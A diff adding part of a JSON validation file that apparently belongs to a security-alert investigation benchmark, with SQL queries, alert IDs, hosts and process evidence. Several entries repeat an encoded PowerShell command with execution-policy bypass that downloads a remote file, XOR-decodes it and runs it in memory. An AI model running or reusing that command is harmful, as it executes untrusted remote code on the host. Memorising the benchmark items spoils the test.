+              "graph_value": "4656__2024-06-26t15:49:41.4025245z__\"powershell.exe\" -executionpolicy bypass -encodedcommand wwboaguadaauafmazqbyahyaaqbjaguauabvagkabgb0ae0ayqbuageazwblahiaxqa6adoauwblagmadqbyagkadab5afaacgbvahqabwbjag8abaagad0aiabbae4azqb0ac4auwblagmadqbyagkadab5afaacgbvahqabwbjag8ababuahkacablaf0aoga6afqababzadeamga7acqaeabvahiaiaa9acaawwbtahkacwb0aguabqauafqazqb4ahqalgbfag4aywbvagqaaqbuagcaxqa6adoavqbuaeyaoaauaecazqb0aeiaeqb0aguacwaoaccavwbpag4aqqbuafaalqbjag4adabyag8alqbjag4aagblagmadabpag8abganackaowakagiayqbzaguanga0afmadabyagkabgbnacaapqagacgasqbuahyabwbragualqbxaguaygbsaguacqb1aguacwb0acaalqbvafiasqagaggadab0ahaacwa6ac8alwb3agmazabzahqayqb0agkaywbmagkabablahmacabyagqazqb1ahmalgbiagwabwbiac4aywbvahiazqauahcaaqbuagqabwb3ahmalgbuaguadaavahcaywbkahmadabhahqaaqbjagyaaqbsaguacwavafcaaqbuaeeavabqac0asqbuahqacgbvac0argbpagwazqbsaguacwbzac4adab4ahqaiaatafuacwblaeiayqbzagkaywbqageacgbzagkabgbnackalgbdag8abgb0aguabgb0adsavabyahkaewagacqaywbvag4adablag4adabcahkadablahmaiaa9acaawwbtahkacwb0aguabqauaemabwbuahyazqbyahqaxqa6adoargbyag8abqbcageacwbladyanabtahqacgbpag4azwaoacqaygbhahmazqa2adqauwb0ahiaaqbuagcakqagah0aiabdageadabjaggaiab7acaajabjag8abgb0aguabgb0aeiaeqb0aguacwagad0aiabbafmaeqbzahqazqbtac4aqwbvag4adgblahiadabdadoaogbgahiabwbtaeiayqbzaguanga0afmadabyagkabgbnacgajabiageacwbladyanabtahqacgbpag4azwauafmadqbiahmadabyagkabgbnacgamwapackaiab9adsajabpacaapqagadaaowagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaapqagaeaakaapadsajabjag8abgb0aguabgb0aeiaeqb0aguacwauagyabwbyaguayqbjaggaewagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaakwa9acaajabfacaalqbiahgabwbyacaajab4ag8acgbbacqaaqbdadsaiaakagkakwaradsaiabpagyaiaaoacqaaqagac0azqbxacaajab4ag8acgauaewazqbuagcadaboackaiab7acqaaqagad0aiaawah0aiab9adsasqbuahyabwbragualqbfahgacabyaguacwbzagkabwbuacaakabbafmaeqbzahqazqbtac4avablahgadaauaeuabgbjag8azabpag4azwbdadoaogbvafqarga4ac4arwblahqauwb0ahiaaqbuagcakaakagqazqbjahiaeqbwahqazqbkaeiaeqb0aguacwapacka -inputformat xml -outputformat text",
+              "raw_components": {
+                "ProcessId": "4656",
+                "CreatedTimeUtc": "2024-06-26T15:49:41.4025245Z",
+                "CommandLine": "\"powershell.exe\" -executionpolicy bypass -encodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7ACQAeABvAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACcAVwBpAG4AQQBUAFAALQBJAG4AdAByAG8ALQBJAG4AagBlAGMAdABpAG8AbgAnACkAOwAkAGIAYQBzAGUANgA0AFMAdAByAGkAbgBnACAAPQAgACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwB3AGMAZABzAHQAYQB0AGkAYwBmAGkAbABlAHMAcAByAGQAZQB1AHMALgBiAGwAbwBiAC4AYwBvAHIAZQAuAHcAaQBuAGQAbwB3AHMALgBuAGUAdAAvAHcAYwBkAHMAdABhAHQAaQBjAGYAaQBsAGUAcwAvAFcAaQBuAEEAVABQAC0ASQBuAHQAcgBvAC0ARgBpAGwAZQBsAGUAcwBzAC4AdAB4AHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0ADsAVAByAHkAewAgACQAYwBvAG4AdABlAG4AdABCAHkAdABlAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKQAgAH0AIABDAGEAdABjAGgAIAB7ACAAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABiAGEAcwBlADYANABTAHQAcgBpAG4AZwAuAFMAdQBiAHMAdAByAGkAbgBnACgAMwApACkAIAB9ADsAJABpACAAPQAgADAAOwAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAPQAgAEAAKAApADsAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAuAGYAbwByAGUAYQBjAGgAewAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAKwA9ACAAJABfACAALQBiAHgAbwByACAAJAB4AG8AcgBbACQAaQBdADsAIAAkAGkAKwArADsAIABpAGYAIAAoACQAaQAgAC0AZQBxACAAJAB4AG8AcgAuAEwAZQBuAGcAdABoACkAIAB7ACQAaQAgAD0AIAAwAH0AIAB9ADsASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjAHIAeQBwAHQAZQBkAEIAeQB0AGUAcwApACkA -inputFormat xml -outputFormat text"
+              },
+              "entity_index": 12,
+              "entity_ref": "14",
+              "roles": [],
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-04 22:35:00.593840+00:00",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "live_validation": [
+    {
+      "variant": "route_382b44db51dbe441",
+      "seed_concept": "Command_File_Mention",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_7eb864af9d22aeb3",
+          "status": "ok",
+          "candidate_count": 29,
+          "unique_values": [
+            "vnevado-win11a"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+          "witnesses": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11a",
+              "raw_components": {
+                "HostName": "vnevado-win11a"
+              },
+              "roles": [],
+              "entity_index": 13,
+              "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+              "time": "2024-07-24 22:35:10.396109+00:00",
+              "source_row_hash": "00d2c81c780d79d8e3de483d054aca3e3e2a0eefa98b44cc04bffc0c7f3f75a6",
+              "matched_inputs": [
+                "notepad.exe"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11a",
+              "raw_components": {
+                "HostName": "vnevado-win11a"
+              },
+              "roles": [],
+              "entity_index": 13,
+              "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+              "time": "2024-07-05 22:34:18.567898+00:00",
+              "source_row_hash": "066f98e7188e32377fe89f34f160689055073e5d00232eb120be3d58ab7cc43e",
+              "matched_inputs": [
+                "notepad.exe"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11a",
+              "raw_components": {
+                "HostName": "vnevado-win11a"
+              },
+              "roles": [],
+              "entity_index": 13,
+              "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+              "time": "2024-07-26 22:35:00.868583+00:00",
+              "source_row_hash": "1075deb6fa37bc8d1353039f1c43f8d16140b501849331108b6293bf4242560f",
+              "matched_inputs": [
+                "notepad.exe"
+              ]
+            }
+          ],
+          "witness_count": 29,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Command_File_Mention' AND o.Concept = 'Host_Name'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Unexpected behavior observed by a process ran with no command line arguments",
+            "notepad.exe"
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_546045b7ece99c80",
+          "status": "ok",
+          "candidate_count": 58,
+          "unique_values": [
+            "4656__2024-06-26t15:49:41.4025245z__\"powershell.exe\" -executionpolicy bypass -encodedcommand wwboaguadaauafmazqbyahyaaqbjaguauabvagkabgb0ae0ayqbuageazwblahiaxqa6adoauwblagmadqbyagkadab5afaacgbvahqabwbjag8abaagad0aiabbae4azqb0ac4auwblagmadqbyagkadab5afaacgbvahqabwbjag8ababuahkacablaf0aoga6afqababzadeamga7acqaeabvahiaiaa9acaawwbtahkacwb0aguabqauafqazqb4ahqalgbfag4aywbvagqaaqbuagcaxqa6adoavqbuaeyaoaauaecazqb0aeiaeqb0aguacwaoaccavwbpag4aqqbuafaalqbjag4adabyag8alqbjag4aagblagmadabpag8abganackaowakagiayqbzaguanga0afmadabyagkabgbnacaapqagacgasqbuahyabwbragualqbxaguaygbsaguacqb1aguacwb0acaalqbvafiasqagaggadab0ahaacwa6ac8alwb3agmazabzahqayqb0agkaywbmagkabablahmacabyagqazqb1ahmalgbiagwabwbiac4aywbvahiazqauahcaaqbuagqabwb3ahmalgbuaguadaavahcaywbkahmadabhahqaaqbjagyaaqbsaguacwavafcaaqbuaeeavabqac0asqbuahqacgbvac0argbpagwazqbsaguacwbzac4adab4ahqaiaatafuacwblaeiayqbzagkaywbqageacgbzagkabgbnackalgbdag8abgb0aguabgb0adsavabyahkaewagacqaywbvag4adablag4adabcahkadablahmaiaa9acaawwbtahkacwb0aguabqauaemabwbuahyazqbyahqaxqa6adoargbyag8abqbcageacwbladyanabtahqacgbpag4azwaoacqaygbhahmazqa2adqauwb0ahiaaqbuagcakqagah0aiabdageadabjaggaiab7acaajabjag8abgb0aguabgb0aeiaeqb0aguacwagad0aiabbafmaeqbzahqazqbtac4aqwbvag4adgblahiadabdadoaogbgahiabwbtaeiayqbzaguanga0afmadabyagkabgbnacgajabiageacwbladyanabtahqacgbpag4azwauafmadqbiahmadabyagkabgbnacgamwapackaiab9adsajabpacaapqagadaaowagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaapqagaeaakaapadsajabjag8abgb0aguabgb0aeiaeqb0aguacwauagyabwbyaguayqbjaggaewagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaakwa9acaajabfacaalqbiahgabwbyacaajab4ag8acgbbacqaaqbdadsaiaakagkakwaradsaiabpagyaiaaoacqaaqagac0azqbxacaajab4ag8acgauaewazqbuagcadaboackaiab7acqaaqagad0aiaawah0aiab9adsasqbuahyabwbragualqbfahgacabyaguacwbzagkabwbuacaakabbafmaeqbzahqazqbtac4avablahgadaauaeuabgbjag8azabpag4azwbdadoaogbvafqarga4ac4arwblahqauwb0ahiaaqbuagcakaakagqazqbjahiaeqbwahqazqbkaeiaeqb0aguacwapacka -inputformat xml -outputformat text",
+            "7472__2024-06-26t15:49:15.7860486z__powershell.exe"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+          "witnesses": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7472__2024-06-26t15:49:15.7860486z__powershell.exe",
+              "raw_components": {
+                "ProcessId": "7472",
+                "CommandLine": "powershell.exe",
+                "CreatedTimeUtc": "2024-06-26T15:49:15.7860486Z"
+              },
+              "roles": [],
+              "entity_index": 2,
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-25 22:39:11.894269+00:00",
+              "source_row_hash": "03f66e7a216aee4770ac0a7b48e2a360f9f1162328a40fff6f168fbf745c2440",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7472__2024-06-26t15:49:15.7860486z__powershell.exe",
+              "raw_components": {
+                "ProcessId": "7472",
+                "CommandLine": "powershell.exe",
+                "CreatedTimeUtc": "2024-06-26T15:49:15.7860486Z"
+              },
+              "roles": [],
+              "entity_index": 2,
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-22 22:39:51.192545+00:00",
+              "source_row_hash": "03facabee10f1d39cfd5777ab408a4a9e904f4d8889da60784571d1d72ee103f",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7472__2024-06-26t15:49:15.7860486z__powershell.exe",
+              "raw_components": {
+                "ProcessId": "7472",
+                "CommandLine": "powershell.exe",
+                "CreatedTimeUtc": "2024-06-26T15:49:15.7860486Z"
+              },
+              "roles": [],
+              "entity_index": 2,
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-23 22:34:43.362337+00:00",
+              "source_row_hash": "0446b7941c5426d969d67e7e4f68b7b912674cedbe6637d43971002ed85dee1b",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            }
+          ],
+          "witness_count": 29,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Host_Name' AND o.Concept = 'Process_Identity'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Suspicious Application Window Discovery",
+            "vnevado-win11a"
+          ],
+          "error": null
+        }
+      ]
+    },
+    {
+      "variant": "route_382b44db51dbe441",
+      "seed_concept": "IP_Address",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_8d6469f2573a39ce",
+          "status": "ok",
+          "candidate_count": 29,
+          "unique_values": [
+            "vnevado-win11a"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+          "witnesses": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11a",
+              "raw_components": {
+                "HostName": "vnevado-win11a"
+              },
+              "roles": [],
+              "entity_index": 13,
+              "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+              "time": "2024-07-24 22:35:10.396109+00:00",
+              "source_row_hash": "00d2c81c780d79d8e3de483d054aca3e3e2a0eefa98b44cc04bffc0c7f3f75a6",
+              "matched_inputs": [
+                "202.183.149.174"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11a",
+              "raw_components": {
+                "HostName": "vnevado-win11a"
+              },
+              "roles": [],
+              "entity_index": 13,
+              "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+              "time": "2024-07-05 22:34:18.567898+00:00",
+              "source_row_hash": "066f98e7188e32377fe89f34f160689055073e5d00232eb120be3d58ab7cc43e",
+              "matched_inputs": [
+                "202.183.149.174"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11a",
+              "raw_components": {
+                "HostName": "vnevado-win11a"
+              },
+              "roles": [],
+              "entity_index": 13,
+              "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+              "time": "2024-07-26 22:35:00.868583+00:00",
+              "source_row_hash": "1075deb6fa37bc8d1353039f1c43f8d16140b501849331108b6293bf4242560f",
+              "matched_inputs": [
+                "202.183.149.174"
+              ]
+            }
+          ],
+          "witness_count": 29,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'IP_Address' AND o.Concept = 'Host_Name'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Unexpected behavior observed by a process ran with no command line arguments",
+            "202.183.149.174"
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_546045b7ece99c80",
+          "status": "ok",
+          "candidate_count": 58,
+          "unique_values": [
+            "4656__2024-06-26t15:49:41.4025245z__\"powershell.exe\" -executionpolicy bypass -encodedcommand wwboaguadaauafmazqbyahyaaqbjaguauabvagkabgb0ae0ayqbuageazwblahiaxqa6adoauwblagmadqbyagkadab5afaacgbvahqabwbjag8abaagad0aiabbae4azqb0ac4auwblagmadqbyagkadab5afaacgbvahqabwbjag8ababuahkacablaf0aoga6afqababzadeamga7acqaeabvahiaiaa9acaawwbtahkacwb0aguabqauafqazqb4ahqalgbfag4aywbvagqaaqbuagcaxqa6adoavqbuaeyaoaauaecazqb0aeiaeqb0aguacwaoaccavwbpag4aqqbuafaalqbjag4adabyag8alqbjag4aagblagmadabpag8abganackaowakagiayqbzaguanga0afmadabyagkabgbnacaapqagacgasqbuahyabwbragualqbxaguaygbsaguacqb1aguacwb0acaalqbvafiasqagaggadab0ahaacwa6ac8alwb3agmazabzahqayqb0agkaywbmagkabablahmacabyagqazqb1ahmalgbiagwabwbiac4aywbvahiazqauahcaaqbuagqabwb3ahmalgbuaguadaavahcaywbkahmadabhahqaaqbjagyaaqbsaguacwavafcaaqbuaeeavabqac0asqbuahqacgbvac0argbpagwazqbsaguacwbzac4adab4ahqaiaatafuacwblaeiayqbzagkaywbqageacgbzagkabgbnackalgbdag8abgb0aguabgb0adsavabyahkaewagacqaywbvag4adablag4adabcahkadablahmaiaa9acaawwbtahkacwb0aguabqauaemabwbuahyazqbyahqaxqa6adoargbyag8abqbcageacwbladyanabtahqacgbpag4azwaoacqaygbhahmazqa2adqauwb0ahiaaqbuagcakqagah0aiabdageadabjaggaiab7acaajabjag8abgb0aguabgb0aeiaeqb0aguacwagad0aiabbafmaeqbzahqazqbtac4aqwbvag4adgblahiadabdadoaogbgahiabwbtaeiayqbzaguanga0afmadabyagkabgbnacgajabiageacwbladyanabtahqacgbpag4azwauafmadqbiahmadabyagkabgbnacgamwapackaiab9adsajabpacaapqagadaaowagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaapqagaeaakaapadsajabjag8abgb0aguabgb0aeiaeqb0aguacwauagyabwbyaguayqbjaggaewagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaakwa9acaajabfacaalqbiahgabwbyacaajab4ag8acgbbacqaaqbdadsaiaakagkakwaradsaiabpagyaiaaoacqaaqagac0azqbxacaajab4ag8acgauaewazqbuagcadaboackaiab7acqaaqagad0aiaawah0aiab9adsasqbuahyabwbragualqbfahgacabyaguacwbzagkabwbuacaakabbafmaeqbzahqazqbtac4avablahgadaauaeuabgbjag8azabpag4azwbdadoaogbvafqarga4ac4arwblahqauwb0ahiaaqbuagcakaakagqazqbjahiaeqbwahqazqbkaeiaeqb0aguacwapacka -inputformat xml -outputformat text",
+            "7472__2024-06-26t15:49:15.7860486z__powershell.exe"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+          "witnesses": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7472__2024-06-26t15:49:15.7860486z__powershell.exe",
+              "raw_components": {
+                "ProcessId": "7472",
+                "CommandLine": "powershell.exe",
+                "CreatedTimeUtc": "2024-06-26T15:49:15.7860486Z"
+              },
+              "roles": [],
+              "entity_index": 2,
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-25 22:39:11.894269+00:00",
+              "source_row_hash": "03f66e7a216aee4770ac0a7b48e2a360f9f1162328a40fff6f168fbf745c2440",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7472__2024-06-26t15:49:15.7860486z__powershell.exe",
+              "raw_components": {
+                "ProcessId": "7472",
+                "CommandLine": "powershell.exe",
+                "CreatedTimeUtc": "2024-06-26T15:49:15.7860486Z"
+              },
+              "roles": [],
+              "entity_index": 2,
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-22 22:39:51.192545+00:00",
+              "source_row_hash": "03facabee10f1d39cfd5777ab408a4a9e904f4d8889da60784571d1d72ee103f",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7472__2024-06-26t15:49:15.7860486z__powershell.exe",
+              "raw_components": {
+                "ProcessId": "7472",
+                "CommandLine": "powershell.exe",
+                "CreatedTimeUtc": "2024-06-26T15:49:15.7860486Z"
+              },
+              "roles": [],
+              "entity_index": 2,
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-23 22:34:43.362337+00:00",
+              "source_row_hash": "0446b7941c5426d969d67e7e4f68b7b912674cedbe6637d43971002ed85dee1b",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            }
+          ],
+          "witness_count": 29,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Host_Name' AND o.Concept = 'Process_Identity'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Suspicious Application Window Discovery",
+            "vnevado-win11a"
+          ],
+          "error": null
+        }
+      ]
+    },
+    {
+      "variant": "route_382b44db51dbe441",
+      "seed_concept": "Process_Identity",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_d1102041c654bb01",
+          "status": "ok",
+          "candidate_count": 29,
+          "unique_values": [
+            "vnevado-win11a"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+          "witnesses": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11a",
+              "raw_components": {
+                "HostName": "vnevado-win11a"
+              },
+              "roles": [],
+              "entity_index": 13,
+              "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+              "time": "2024-07-24 22:35:10.396109+00:00",
+              "source_row_hash": "00d2c81c780d79d8e3de483d054aca3e3e2a0eefa98b44cc04bffc0c7f3f75a6",
+              "matched_inputs": [
+                "8932__2024-06-26t15:49:51.3043595z__\"notepad.exe\""
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11a",
+              "raw_components": {
+                "HostName": "vnevado-win11a"
+              },
+              "roles": [],
+              "entity_index": 13,
+              "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+              "time": "2024-07-05 22:34:18.567898+00:00",
+              "source_row_hash": "066f98e7188e32377fe89f34f160689055073e5d00232eb120be3d58ab7cc43e",
+              "matched_inputs": [
+                "8932__2024-06-26t15:49:51.3043595z__\"notepad.exe\""
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11a",
+              "raw_components": {
+                "HostName": "vnevado-win11a"
+              },
+              "roles": [],
+              "entity_index": 13,
+              "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+              "time": "2024-07-26 22:35:00.868583+00:00",
+              "source_row_hash": "1075deb6fa37bc8d1353039f1c43f8d16140b501849331108b6293bf4242560f",
+              "matched_inputs": [
+                "8932__2024-06-26t15:49:51.3043595z__\"notepad.exe\""
+              ]
+            }
+          ],
+          "witness_count": 29,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Process_Identity' AND o.Concept = 'Host_Name'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Unexpected behavior observed by a process ran with no command line arguments",
+            "8932__2024-06-26t15:49:51.3043595z__\"notepad.exe\""
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_546045b7ece99c80",
+          "status": "ok",
+          "candidate_count": 58,
+          "unique_values": [
+            "4656__2024-06-26t15:49:41.4025245z__\"powershell.exe\" -executionpolicy bypass -encodedcommand wwboaguadaauafmazqbyahyaaqbjaguauabvagkabgb0ae0ayqbuageazwblahiaxqa6adoauwblagmadqbyagkadab5afaacgbvahqabwbjag8abaagad0aiabbae4azqb0ac4auwblagmadqbyagkadab5afaacgbvahqabwbjag8ababuahkacablaf0aoga6afqababzadeamga7acqaeabvahiaiaa9acaawwbtahkacwb0aguabqauafqazqb4ahqalgbfag4aywbvagqaaqbuagcaxqa6adoavqbuaeyaoaauaecazqb0aeiaeqb0aguacwaoaccavwbpag4aqqbuafaalqbjag4adabyag8alqbjag4aagblagmadabpag8abganackaowakagiayqbzaguanga0afmadabyagkabgbnacaapqagacgasqbuahyabwbragualqbxaguaygbsaguacqb1aguacwb0acaalqbvafiasqagaggadab0ahaacwa6ac8alwb3agmazabzahqayqb0agkaywbmagkabablahmacabyagqazqb1ahmalgbiagwabwbiac4aywbvahiazqauahcaaqbuagqabwb3ahmalgbuaguadaavahcaywbkahmadabhahqaaqbjagyaaqbsaguacwavafcaaqbuaeeavabqac0asqbuahqacgbvac0argbpagwazqbsaguacwbzac4adab4ahqaiaatafuacwblaeiayqbzagkaywbqageacgbzagkabgbnackalgbdag8abgb0aguabgb0adsavabyahkaewagacqaywbvag4adablag4adabcahkadablahmaiaa9acaawwbtahkacwb0aguabqauaemabwbuahyazqbyahqaxqa6adoargbyag8abqbcageacwbladyanabtahqacgbpag4azwaoacqaygbhahmazqa2adqauwb0ahiaaqbuagcakqagah0aiabdageadabjaggaiab7acaajabjag8abgb0aguabgb0aeiaeqb0aguacwagad0aiabbafmaeqbzahqazqbtac4aqwbvag4adgblahiadabdadoaogbgahiabwbtaeiayqbzaguanga0afmadabyagkabgbnacgajabiageacwbladyanabtahqacgbpag4azwauafmadqbiahmadabyagkabgbnacgamwapackaiab9adsajabpacaapqagadaaowagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaapqagaeaakaapadsajabjag8abgb0aguabgb0aeiaeqb0aguacwauagyabwbyaguayqbjaggaewagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaakwa9acaajabfacaalqbiahgabwbyacaajab4ag8acgbbacqaaqbdadsaiaakagkakwaradsaiabpagyaiaaoacqaaqagac0azqbxacaajab4ag8acgauaewazqbuagcadaboackaiab7acqaaqagad0aiaawah0aiab9adsasqbuahyabwbragualqbfahgacabyaguacwbzagkabwbuacaakabbafmaeqbzahqazqbtac4avablahgadaauaeuabgbjag8azabpag4azwbdadoaogbvafqarga4ac4arwblahqauwb0ahiaaqbuagcakaakagqazqbjahiaeqbwahqazqbkaeiaeqb0aguacwapacka -inputformat xml -outputformat text",
+            "7472__2024-06-26t15:49:15.7860486z__powershell.exe"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+          "witnesses": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7472__2024-06-26t15:49:15.7860486z__powershell.exe",
+              "raw_components": {
+                "ProcessId": "7472",
+                "CommandLine": "powershell.exe",
+                "CreatedTimeUtc": "2024-06-26T15:49:15.7860486Z"
+              },
+              "roles": [],
+              "entity_index": 2,
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-25 22:39:11.894269+00:00",
+              "source_row_hash": "03f66e7a216aee4770ac0a7b48e2a360f9f1162328a40fff6f168fbf745c2440",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7472__2024-06-26t15:49:15.7860486z__powershell.exe",
